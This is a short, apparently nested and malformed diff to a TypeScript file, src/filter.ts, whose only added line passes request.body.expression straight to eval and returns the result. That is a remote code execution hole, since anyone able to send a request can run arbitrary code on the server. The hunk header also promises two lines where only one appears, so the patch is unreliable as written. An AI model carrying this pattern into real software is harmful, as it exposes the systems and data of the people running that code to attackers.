@@ -1,0 +1,5 @@
+diff --git a/src/filter.ts b/src/filter.ts
+--- a/src/filter.ts
++++ b/src/filter.ts
+@@ -1,1 +1,2 @@
++return eval(request.body.expression);
